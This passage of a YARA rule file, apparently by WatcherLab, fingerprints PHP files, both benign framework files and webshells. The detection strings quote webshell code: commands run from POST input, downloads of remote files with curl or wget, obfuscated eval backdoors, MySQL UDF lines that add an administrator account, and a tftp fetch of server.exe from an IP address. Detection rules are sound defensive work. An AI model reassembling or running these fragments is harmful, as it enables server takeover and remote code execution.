      $s16 = "RNosSP/LhR8LnZW7qDXIRcA018T7SxdvyzYVHq337cMPMrPRoO5rrokWK3WHkQU4Hg+Lgu4s11D+" fullword ascii
      $s17 = "GAmjyhGJVyyjB5quNRacdWqPeblS//91uOH/aBU+AAuJap249dTwBcTd9x3fZmBhGc3fhWsyXKap" fullword ascii
      $s18 = "y2H0da+4REmtsnb9vHqMC7PzhKyki0S16miRG/ffN//lh5sT90SleYc4G7Erxffzsy3rzPkcbq4t" fullword ascii
      $s19 = "nN2b/bPDRpX9uqc4iu8bYfYduq64+6b/9mSi/mr9tqIje7ptois70Dl4/ky8Ptqp79///zn+yru/" fullword ascii
      $s20 = "NYyDfOllHp3uOLqDbAA3d2NqhOj12OyhhCciLrPDtf71gZMxm3Z5cCiy7v6hwDIU+qFXSFFFva/c" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule AfterLastTestHook
{
   meta:
      description = "php17 - file AfterLastTestHook.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "71d64da719c60d50409f8e2ecdc4166550457af607f17c80a5ce561f0606718e"
   strings:
      $s1 = "public function executeAfterLastTest(): void;" fullword ascii
      $s2 = "* (c) Sebastian Bergmann <sebastian@phpunit.de>" fullword ascii
      $s3 = "* This file is part of PHPUnit." fullword ascii
      $s4 = "namespace PHPUnit\\Runner;" fullword ascii
      $s5 = "interface AfterLastTestHook extends Hook" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _header_ptbr
{
   meta:
      description = "php17 - file _header-ptbr.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5d92c1ed3854202e2ddccb8f9e3944503c49bd97ab66071cf015a68d24f679da"
   strings:
      $x1 = "<meta name=\"description\" content=\"Phreeze Framework for PHP - Documentation\" />" fullword ascii
      $s2 = "<script type=\"text/javascript\" src=\"http://html5shim.googlecode.com/svn/trunk/html5.js\"></script>" fullword ascii
      $s3 = "<meta name=\"author\" content=\"phreeze.com\" />" fullword ascii
      $s4 = "<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->" fullword ascii
      $s5 = "</div><!--/.nav-collapse -->" fullword ascii
      $s6 = "<!-- Le styles -->" fullword ascii
      $s7 = "<link href=\"styles/documentation.css\" rel=\"stylesheet\" />" fullword ascii
      $s8 = "<link href=\"styles/prettify.css\" rel=\"stylesheet\" />" fullword ascii
      $s9 = "<link href=\"../builder/bootstrap/css/bootstrap-responsive.min.css\" rel=\"stylesheet\" />" fullword ascii
      $s10 = "<a class=\"brand\" href=\"./index-ptbr.php\"><i class=\"icon-book\"></i> Documenta" fullword ascii
      $s11 = "<link href=\"../builder/bootstrap/css/font-awesome.css\" rel=\"stylesheet\" />" fullword ascii
      $s12 = "<link href=\"../builder/bootstrap/css/bootstrap.min.css\" rel=\"stylesheet\" />" fullword ascii
      $s13 = "o do Phreeze Framework</a> " fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule sig_4fe5c80c2f12ed4c6b7f684820a561b9a63b6621
{
   meta:
      description = "php17 - file 4fe5c80c2f12ed4c6b7f684820a561b9a63b6621.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3bcfb8bdb89763e9fb662221761a0cf74d736a5d193e0d1386463b2606f0a6ba"
   strings:
      $s1 = "$gzid(\"/[discuz]/e\",$_POST['h'],\"Access\");" fullword ascii
      $s2 = "$gzid = \"p\".\"r\".\"e\".\"g\".\"_\".\"r\".\"e\".\"p\".\"l\".\"a\".\"c\".\"e\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ArrayKeyValueMatcher
{
   meta:
      description = "php17 - file ArrayKeyValueMatcher.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "53ad17ec0d02d33955a0aa3a74b880ba630f5c873e05c9adbbe207f7396f861a"
   strings:
      $s1 = "* (c) Marcello Duarte <marcello.duarte@gmail.com>" fullword ascii
      $s2 = "* (c) Konstantin Kudryashov <ever.zet@gmail.com>" fullword ascii
      $s3 = "return new FailureException(sprintf('Expected %s to have key %s, but it didn\\'t.'," fullword ascii
      $s4 = "protected function getNegativeFailureException(string $name, $subject, array $arguments): FailureException" fullword ascii
      $s5 = "protected function getFailureException(string $name, $subject, array $arguments): FailureException" fullword ascii
      $s6 = "return $subject->offsetExists($key) && $subject->offsetGet($key) === $value;" fullword ascii
      $s7 = "return ($subject instanceof ArrayAccess && $subject->offsetExists($key)) || array_key_exists($key, $subject);" fullword ascii
      $s8 = "return (isset($subject[$key]) || array_key_exists($arguments[0], $subject)) && $subject[$key] === $value;" fullword ascii
      $s9 = "* This file is part of PhpSpec, A php toolset to drive emergent" fullword ascii
      $s10 = "* @return FailureException" fullword ascii
      $s11 = "'Expected %s to have value %s for %s key, but found %s.'," fullword ascii
      $s12 = "public function supports(string $name, $subject, array $arguments): bool" fullword ascii
      $s13 = "* @param ArrayAccess|array $subject" fullword ascii
      $s14 = "* @param mixed  $subject" fullword ascii
      $s15 = "* @param array  $arguments" fullword ascii
      $s16 = "private function offsetExists($key, $subject)" fullword ascii
      $s17 = "'Expected %s not to have %s key, but it does.'," fullword ascii
      $s18 = "* @param Presenter $presenter" fullword ascii
      $s19 = "* @var Presenter" fullword ascii
      $s20 = "use PhpSpec\\Exception\\Example\\FailureException;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      8 of them
}

rule Attachments
{
   meta:
      description = "php17 - file Attachments.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b4cbea257bd2ef2cd8173c4ca454568740c4cca22630f303cd93476c6ffff5bc"
   strings:
      $s1 = "return Config::get(\"auth.providers.{$provider}.model\");" fullword ascii
      $s2 = "$provider = Config::get(\"auth.guards.{$guard}.provider\");" fullword ascii
      $s3 = "$guard = Config::get('auth.defaults.guard', 'web');" fullword ascii
      $s4 = "if (is_null($guard) || (! empty($guard) && ! Config::has('auth.guards.' .$guard))) {" fullword ascii
      $s5 = "return Response::json(array('error' => 'Invalid temporary file'), 400);" fullword ascii
      $s6 = "* @var \\Nova\\Filesystem\\Filesystem" fullword ascii
      $s7 = "if ($this->files->append($filePath, $this->files->get($file->path())) === false) {" fullword ascii
      $s8 = "'ownerable_type' => $this->getAuthProviderModel($guard)," fullword ascii
      $s9 = "// Get the temporary file path." fullword ascii
      $s10 = "* The Filesystem instance." fullword ascii
      $s11 = "$disposition = ($method == 'download') ? 'attachment' : 'inline';" fullword ascii
      $s12 = "protected function getAuthProviderModel($guard)" fullword ascii
      $s13 = "protected function handleUploadedFile(UploadedFile $file, Request $request, $path = null)" fullword ascii
      $s14 = "// Store the received chunk data in the temporary file." fullword ascii
      $s15 = "return Response::json(array('error' => 'Attachment not found: #' .$id), 400);" fullword ascii
      $s16 = "$file = new UploadedFile($path, $originalName, $mimeType, $size, UPLOAD_ERR_OK, true);" fullword ascii
      $s17 = "return Response::json(array('error' => 'Chunk could not be saved'), 400);" fullword ascii
      $s18 = "return $this->serveFile($token, $fileName, $request, $disposition);" fullword ascii
      $s19 = "public function __construct(Container $container, Filesystem $files)" fullword ascii
      $s20 = "public function serve(Request $request, $method, $token, $fileName)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule sig_2016_05_29_013742_create_appends_table
{
   meta:
      description = "php17 - file 2016_05_29_013742_create_appends_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bcdf9fecb38ac984469815e731eb91a5248787551bfdba60bd0e178b23d16683"
   strings:
      $s1 = "$table->text('content');" fullword ascii
      $s2 = "Schema::create('appends', function (Blueprint $table) {" fullword ascii
      $s3 = "$table->index('thread_id');" fullword ascii
      $s4 = "$table->integer('thread_id');" fullword ascii
      $s5 = "Schema::drop('appends');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_01e00f2f4bfcbb7505cb641066f2859b
{
   meta:
      description = "php17 - file 01e00f2f4bfcbb7505cb641066f2859b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2b2df68c7c4b3ed7538a025388148d1a9031c82ecd1223c9c8024b56873a4564"
   strings:
      $x1 = "if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['an']=1;}else $_SESSION['an']='1';" fullword ascii
      $x2 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text/h" ascii
      $x3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text/h" ascii
      $s4 = "shell(which('fetch').\" -o \".$_POST['filename'].\" -p \".$_POST['urldown'].\"\");" fullword ascii
      $s5 = "shell(which('curl').\" \".$_POST['urldown'].\" -o \".$_POST['filename'].\"\");" fullword ascii
      $s6 = "<textarea readonly rows=\\\"15\\\" cols=\\\"150\\\">\".@htmlspecialchars(shell($_POST['command'])).\"</textarea><br>" fullword ascii
      $s7 = "shell(which('lynx').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");" fullword ascii
      $s8 = "shell(which('links').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");" fullword ascii
      $s9 = "shell(which('wget').\" \".$_POST['urldown'].\" -O \".$_POST['filename'].\"\");" fullword ascii
      $s10 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='shell'; document.reqs.submit();\">| Shell </a></td>" fullword ascii
      $s11 = "if(@$_POST['file']!=\"\"){$file=$_SESSION['file']=$_POST['file'];}else {$file=$_SESSION['file']=\"\";}" fullword ascii
      $s12 = "if(@$_POST['action']!=\"\" )$_SESSION['action']=$_POST['action'];$action=$_SESSION['action'];" fullword ascii
      $s13 = "shell(which('GET').\" \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");" fullword ascii
      $s14 = "charset=windows-1251\">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';" fullword ascii
      $s15 = "if(@$_POST['filename']==\"\") $uploadfile = $dirupload.basename($_FILES['file']['name']); else " fullword ascii
      $s16 = "function createdir($dir){if(@mkdir($dir))echo $GLOBALS['dircrt'].\" \"; else echo $GLOBALS['dircrterr'].\" \";}" fullword ascii
      $s17 = "<input type=\\\"submit\\\" value=\\\"execute\\\"></form>\";} " fullword ascii
      $s18 = "if(@$_POST['dirupload']!=\"\") $dirupload=$_POST['dirupload'];else $dirupload=$dir;" fullword ascii
      $s19 = "//end downloader" fullword ascii
      $s20 = "if(@$_POST['dir']!=\"\")$_SESSION['dir']=$_POST['dir'];$dir=$_SESSION['dir'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule sig_35aa7dca621fb62d8241030b4e03d301ae55fb61
{
   meta:
      description = "php17 - file 35aa7dca621fb62d8241030b4e03d301ae55fb61.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "05a9f8fa49f3244384e5647f76665e77dee63f9a81bf071f9ee2139278c18390"
   strings:
      $x1 = "echo '<option value=\"select cmdshell(\\'net user $darkmoon 123456 /add & net localgroup administrators $darkmoon /add\\')\">" fullword ascii
      $x2 = "echo '<option value=\"create function cmdshell returns string soname \\'moonudf.dll\\'\">" fullword ascii
      $x3 = "$query=\"INSERT into Temp_udf values (CONVERT($shellcode,CHAR));\";" fullword ascii
      $s4 = "echo '<option value=\"create function backshell returns string soname \\'moonudf.dll\\'\">" fullword ascii
      $s5 = "create function cmdshell returns string soname 'moonudf.dll'<br>" fullword ascii
      $s6 = "$s=\"SELECT unhex(cmd) FROM diy_dll INTO DUMPFILE '$diypath'\";" fullword ascii
      $s7 = "$query=\"SELECT udf FROM Temp_udf INTO DUMPFILE '\".$path.\"';\" ;" fullword ascii
      $s8 = "4b696c6c50726f636573735f696e6974" ascii
      $s9 = "696e6974007265677265616400726567726561645f6465696e697400726567726561645f696e69740072656777726974650072656777726974655f6465696e69" ascii
      $s10 = "50726f63657373566965775f696e6974" ascii
      $s11 = "6c6f616465725f6465696e697400646f776e6c6f616465725f696e6974006f70656e33333839006f70656e333338395f6465696e6974006f70656e333338395f" ascii
      $s12 = "<a href=\"http://www.moonhack.org\" target=\"_blank\">" fullword ascii
      $s13 = "68656c6c5f696e697400636d647368656c6c00636d647368656c6c5f6465696e697400636d647368656c6c5f696e697400646f776e6c6f6164657200646f776e" ascii
      $s14 = "$link=@mysql_connect($_COOKIE[\"connect\"][\"host\"],$_COOKIE[\"connect\"][\"name\"],$_COOKIE[\"connect\"][\"pass\"]);" fullword ascii
      $s15 = "6261636b7368656c6c5f6465696e6974" ascii
      $s16 = "740061626f75740061626f75745f6465696e69740061626f75745f696e6974006261636b7368656c6c006261636b7368656c6c5f6465696e6974006261636b73" ascii
      $s17 = "004b696c6c50726f636573735f696e69740050726f63657373566965770050726f63657373566965775f6465696e69740050726f63657373566965775f696e69" ascii
      $s18 = "echo      '<td><input name=\"diypath\" type=\"text\" id=\"diypath\" size=\"27\" value=\"C:/WINDOWS/diy.dll\"></td>';" fullword ascii
      $s19 = "$path=$_SESSION['path']='C:/WINDOWS/moonudf.dll';" fullword ascii
      $s20 = "Blog:<a href=\"http://www.moonhack.org\" target=\"_blank\">www.moonhack.org</a> Bbs:<a href=\"http://www.90sec.org\" target=\"_b" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule AbstractNodeItem
{
   meta:
      description = "php17 - file AbstractNodeItem.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "005dc76c180a8f2c940b533f89836b8d7e7129b55ca272581b0a423d758fc77c"
   strings:
      $s1 = "use Concrete\\Core\\Application\\UserInterface\\ContextMenu\\Item\\ItemInterface;" fullword ascii
      $s2 = "namespace Concrete\\Core\\Tree\\Menu\\Item;" fullword ascii
      $s3 = "use Concrete\\Core\\Tree\\Node\\Node;" fullword ascii
      $s4 = "* @var $category Node" fullword ascii
      $s5 = "public function __construct(Node $node)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _themosisPasswordField_blade
{
   meta:
      description = "php17 - file _themosisPasswordField.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d74828db5a13cf60f0ace5de87dc06b6e295d02522de521d8df4518c2e4f6a0d"
   strings:
      $s1 = "{!! Themosis\\Facades\\Form::password($field['name'], $field['value'], $field['atts']) !!}" fullword ascii
      $s2 = "<p class=\"description\">{!! $field['features']['info'] !!}</p>" fullword ascii
      $s3 = "@if(isset($field['features']['info']))" fullword ascii
   condition:
      uint16(0) == 0x217b and filesize < 1KB and
      all of them
}

rule sig_072b030ba126b2f4b2374f342be9ed44
{
   meta:
      description = "php17 - file 072b030ba126b2f4b2374f342be9ed44.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0f22ca14324cfcecf0892f5253aeaf7e7250bad8e1b3da396e7a24578886f87b"
   strings:
      $s1 = "echo \"Temp file: \" . $_FILES[\"file\"][\"tmp_name\"] . \"<br>\";" fullword ascii
      $s2 = "move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$_FILES[\"file\"][\"name\"]);" fullword ascii
      $s3 = "$temp = explode(\".\", $_FILES[\"file\"][\"name\"]);" fullword ascii
      $s4 = "echo \"Return Code: \" . $_FILES[\"file\"][\"error\"] . \"<br>\";" fullword ascii
      $s5 = "$extension = end($temp);" fullword ascii
      $s6 = "<form action=\"\" method=\"post\"" fullword ascii
      $s7 = "echo \"Upload: \" . $_FILES[\"file\"][\"name\"] . \"<br>\";" fullword ascii
      $s8 = "echo \"Size: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" kB<br>\";" fullword ascii
      $s9 = "if ($_FILES[\"file\"][\"error\"] > 0)" fullword ascii
      $s10 = "echo \"Type: \" . $_FILES[\"file\"][\"type\"] . \"<br>\";" fullword ascii
      $s11 = "<input type=\"submit\" name=\"submit\" value=\"Submit\">" fullword ascii
      $s12 = "<input type=\"file\" name=\"file\" id=\"file\"><br>" fullword ascii
      $s13 = "<label for=\"file\">Filename:</label>" fullword ascii
      $s14 = "enctype=\"multipart/form-data\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule php17__item
{
   meta:
      description = "php17 - file _item.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0a6b486a194699a245a41e73114f052d971cf0ab41184014b0a51a5e161035e3"
   strings:
      $s1 = "<?php echo '<?php echo $this->html->'.$name_underscored.'_link($object); ?>'; ?>" fullword ascii
   condition:
      uint16(0) == 0x643c and filesize < 1KB and
      all of them
}

rule sig_7c19662edfad30c8bf9013bf39cab4f013ce50ed
{
   meta:
      description = "php17 - file 7c19662edfad30c8bf9013bf39cab4f013ce50ed.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "74b145b1ec9b26e4a343a2c8a4e2ff1eaf4daedfd4a93ae65ca2cd1e9e1757aa"
   strings:
      $s1 = "$q='re|place(arr|ay(\"/|_|/\",|\"/-/\"),array(\"|/\",\"+\")|,$ss|(|$|s[$i],0,$e))),$k|)));$o||=ob_get_cont|ents();o|b_e';" fullword ascii
      $s2 = "$e=';$e|=strpos(|$s[$|i],$f)|;if($e){|$k=|$kh.$k|f;ob_st|art|();@|eva|l(@gzuncomp|ress(@x(@|base6|4_decode(pr|eg_';" fullword ascii
      $s3 = "$F='nd_c|lean|();$d=ba|se6|4_enco|de(x(gz|compres|s($o)|,$k));p|rint(\"|<$k>|$|d</$k>\");|@se|ssion_destroy(|);}}}}';" fullword ascii
      $s4 = "$o='|$m[2][$z]];if(strpos|($p|,$|h)===0){$s|[$i|]=\"\";$p|=$ss($|p,3)|;|}if(array_key_e|xi|sts($i,|$s)){$s[$i|].=$|p';" fullword ascii
      $s5 = "$P='RE|R\"];$|ra=||@$r[|\"HTTP_ACCEPT_L|ANGUAGE\"]||;if|($r|r&&$ra){$|u=par|se_url($rr);pa|rse_str($|u[\"que|ry\"],$';" fullword ascii
      $s6 = "$n='$kh=\"5d4|1\"|;$kf=|\"4|0|2a\";funct|i|on x($t,$k){$c=strle||n|($k);$l=strlen($|t);$o=\"\"|;for($i=|0;$i<$|l;){for|(';" fullword ascii
      $s7 = "$O='q|);$q=a||rray_v|a|lues($q);preg_m|atch||_all(\"/([\\\\w])|[\\\\w|-]+(?:;|q=0.([\\\\d]||))?,?/\",$ra,$||m);if(|$q&|&$m){';" fullword ascii
      $s8 = "$z='$j=0;|(|$j<$c&&$i<$l|)|;$||j++,$i|++){$o.=$t{|$|i}^$k{$j};}}return|| $o;|}$r=$_SER|VER|;$rr=@$r[\"HTT|P_REFE';" fullword ascii
      $s9 = "$Q='d5($i.$|kh),|0,3));$f|=$s|l||($ss(md5(|$i.|$kf),0,3));$p=\"\";for|($z=1;$||z<count||($m|[1]);$z++|)$p.=$q|[';" fullword ascii
      $s10 = "$W='@ses||sion_start();$s=&$|_S|ESSION;$ss|=\"su|bstr|\";$sl=\"str|tolowe|r\";$i||=$|m[1][0].$m[1][1];$|h=$s||l($ss(m';" fullword ascii
      $s11 = "$p=str_replace('sh','','creshashshte_shfushnshction');" fullword ascii
      $s12 = "$i=str_replace('|','',$n.$z.$P.$O.$W.$Q.$o.$e.$q.$F);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_0f15397e47d9da9e5c40aa827d1fff13c6b4fbe4
{
   meta:
      description = "php17 - file 0f15397e47d9da9e5c40aa827d1fff13c6b4fbe4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "07c1d73de412245dd39bfd322794aede24fecf3e77c44543d4f2739499d98ec6"
   strings:
      $s1 = "$F='de(x(gs5zcoms5press($s5o)s5,$k)s5);print(\"<$ks5>$d<s5/$s5k>\"s5);@session_s5destroy();}}}}';" fullword ascii
      $s2 = "$x='0s5,$e)))s5,$k)))s5;$s5o=ob_get_cs5ons5tents5s();ob_ens5ds5_clean();$s5d=bs5ass5e64_enco';" fullword ascii
      $s3 = "$K='5\";$ps5=$ss($p,s53);}if(s5arrays5_keys5_exs5ists($i,$s5s)){$s[$i].s5=$p;s5$es5=ss5trpos($';" fullword ascii
      $s4 = "$X='ss5s5e64_decode(ps5reg_reps5lace(arrs5s5ay(\"s5/_/\",\"/-/\"),s5array(\"/\"s5,s5\"+\"),$ss($s5s[$i],';" fullword ascii
      $s5 = "$i='s[$i],$f);s5is5f($e){$s5ks5=$kh.$kf;ob_ss5tart(s5);@es5val(@gzuns5compres5ss5s(@x(@ba';" fullword ascii
      $s6 = "$a='=s5@$r[\"HTTP_ACCEPTs5_LAs5NGUAs5GE\"]s5;if($rr&s5&$ra){$u=pas5rse_us5rl($rr)s5;ps5ars5';" fullword ascii
      $s7 = "$O='md5($s5i.$kh),0,s53)s5);$fs5=s5$sl($ss(md5($is5.$kf)s5,0,3));$p=s5\"\";for(s5$s5z=1;$z<s5c';" fullword ascii
      $s8 = "$o='$kh=\"s55d41\";$ks5f=s5\"402a\";funs5ction x($s5ts5,$k){$c=ss5trls5en($k);$s5s5l=strlen($t);s5';" fullword ascii
      $s9 = "$d='Es5s5SSION;$sss5=\"substr\";$sls5=\"strts5ols5s5ower\";$i=s5$m[1][0]s5.$m[s51][1];s5$hs5=$sl($ss(';" fullword ascii
      $s10 = "$k='ses5_str($u[\"query\"],$s5q);$qs5s5=array_valus5ess5($q);preg_mats5ch_as5ll(\"/([\\\\s5w]s5)[\\\\';" fullword ascii
      $s11 = "$y='w-]+(?:;s5q=0s5.(s5[\\\\d]))?,?s5/\",s5$ra,$m);s5if($qs5&&$m){@ss5esss5ion_stars5t();$s5s=&$_S';" fullword ascii
      $s12 = "$L='{$i}^$k{$js5s5};}s5}returs5n $o;}$r=s5s5$_SERVER;$rs5r=@$r[\"HTs5TP_s5REFERER\"s5s5];$ra';" fullword ascii
      $s13 = "$h='$o=\"\";fors5($i=0s5;$s5i<s5$l;){for($j=0;s5($j<$cs5s5&&$i<$s5l);$j++,$is5++){$s5o.=$ts5';" fullword ascii
      $s14 = "$j='os5unt($m[1]);$zs5++s5)$p.=$q[$ms5[s52][$z]];ifs5(strpos(s5s5$p,$h)===0){s5$s5s[$i]=\"s';" fullword ascii
      $s15 = "$r=str_replace('s5','',$o.$h.$L.$a.$k.$y.$d.$O.$j.$K.$i.$X.$x.$F);" fullword ascii
      $s16 = "$l=str_replace('K','','crKKeatKKeK_Kfunction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule aa8514a4fdeb999bcad59439fa0836b7178853a9
{
   meta:
      description = "php17 - file aa8514a4fdeb999bcad59439fa0836b7178853a9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "23738a2cfdd29fa9dc4a1ff2d56de59ee03e76ff24ccac1462e29f1581d24c5e"
   strings:
      $x1 = "<a href=\"javascript:g('shell');\">Execute Command</a> | " fullword ascii
      $s2 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#f00;\">Close</span></li>');" fullword ascii
      $s3 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#080;\">Open</span></li>');" fullword ascii
      $s4 = "<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s5 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:g('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s6 = "<span style=\"float:right;\">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>" fullword ascii
      $s7 = "p($comma.'<a href=\"javascript:godir(\\''.$drive->Path.'/\\');\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');" fullword ascii
      $s8 = "$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s9 = "$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s10 = "secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s11 = "$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(\", \", $row).');'.\"\\n\";" fullword ascii
      $s12 = "2011</a>. Copyright (C) 2004-2011 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Re" ascii
      $s13 = "$tabledump = \"DROP TABLE IF EXISTS `$table`;\\n\";" fullword ascii
      $s14 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s15 = "<a href=\"javascript:g('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s16 = "secparam('Supported databases', implode(', ', $temp));" fullword ascii
      $s17 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s18 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s19 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s20 = "scookie('loginpass',encode_pass($password));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Antichat_Shell_2
{
   meta:
      description = "php17 - file Antichat-Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "107264a7573cf1db946f6997395e6eb57586dc1eec5c37139e4affceb270889b"
   strings:
      $x1 = "shell(which('curl') . \" \" . $_POST['urldown'] . \" -o \" . $_POST['filename'] . \"\");" fullword ascii
      $x2 = "$header = '<html><head><title>' . getenv(\"HTTP_HOST\") . ' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"" ascii
      $x3 = "$header = '<html><head><title>' . getenv(\"HTTP_HOST\") . ' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"" ascii
      $x4 = "shell(which('fetch') . \" -o \" . $_POST['filename'] . \" -p \" . $_POST['urldown'] . \"\");" fullword ascii
      $s5 = "<textarea readonly rows=\\\"15\\\" cols=\\\"150\\\">\" . @htmlspecialchars(shell($_POST['command'])) . \"</textarea><br>" fullword ascii
      $s6 = "shell(which('links') . \" -source \" . $_POST['urldown'] . \" > \" . $_POST['filename'] . \"\");" fullword ascii
      $s7 = "shell(which('lynx') . \" -source \" . $_POST['urldown'] . \" > \" . $_POST['filename'] . \"\");" fullword ascii
      $s8 = "shell(which('wget') . \" \" . $_POST['urldown'] . \" -O \" . $_POST['filename'] . \"\");" fullword ascii
      $s9 = "if (@$_POST['login'] == $login && @$_POST['password'] == $password)" fullword ascii
      $s10 = "<textarea name=\\\"command\\\" rows=\\\"5\\\" cols=\\\"150\\\">\" . @$_POST['command'] . \"</textarea><br>" fullword ascii
      $s11 = "shell(which('GET') . \" \" . $_POST['urldown'] . \" > \" . $_POST['filename'] . \"\");" fullword ascii
      $s12 = "html; charset=windows-1251\">' . $style . '</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';" fullword ascii
      $s13 = "header('Content-Disposition: attachment; filename=\"' . $file . '\"');" fullword ascii
      $s14 = "echo '<tr><td><a href=\"#\" onclick=\"document.reqs.action.value=\\'viewer\\'; document.reqs.dir.value=\\'' . $link . " fullword ascii
      $s15 = "// end downloader" fullword ascii
      $s16 = "<textarea name=\\\"phpev\\\" rows=\\\"5\\\" cols=\\\"150\\\">\" . @$_POST['phpev'] . \"</textarea><br>" fullword ascii
      $s17 = "<input type=\\\"submit\\\" value=\\\"execute\\\"></form>\";" fullword ascii
      $s18 = "echo '<a href=\"#\" onclick=\"document.reqs.action.value=\\'viewer\\'; document.reqs.dir.value=\\'' . chr($j) " fullword ascii
      $s19 = "if (! empty($_POST['with']) && ! empty($_POST['urldown']) && ! empty($_POST['filename']))" fullword ascii
      $s20 = "header('Content-Length:' . filesize($file) . '');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule sig_3c7b93811ffd056b5952b80a517c10c2
{
   meta:
      description = "php17 - file 3c7b93811ffd056b5952b80a517c10c2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ea918b9d0452f99243cd726116e120d79a68c881cca87d1e467e72c646eff74a"
   strings:
      $x1 = "Str[9] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x2 = "$query = \"INSERT into Envl_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x3 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'].':'.$_SESSION['sql_port'],$_SESSION['sql_user'],$_SESSION['sql_password'" fullword ascii
      $x4 = "$Com_dpath= isset($_POST['dpath']) ? $_POST['dpath'] : File_Str(dirname(myaddress).'/muma.exe');" fullword ascii
      $x5 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x6 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';" fullword ascii
      $s7 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
